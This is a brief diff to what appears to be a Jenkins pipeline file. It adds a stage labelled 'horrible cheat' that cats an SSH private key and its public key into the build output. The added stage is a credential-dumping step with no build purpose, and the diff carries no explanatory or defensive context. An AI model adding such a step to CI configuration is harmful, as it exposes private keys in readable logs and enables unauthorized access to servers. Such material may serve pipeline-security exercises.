@@ -41,5 +41,11 @@ make init
               sh 'make apply'
           }
       }
+      stage("horrible cheat") {
+        steps {
+            sh 'cat ./ssh/id_rsa'
+            sh 'cat ./ssh/id_rsa.pub'
+        }
+      }
   }
 }
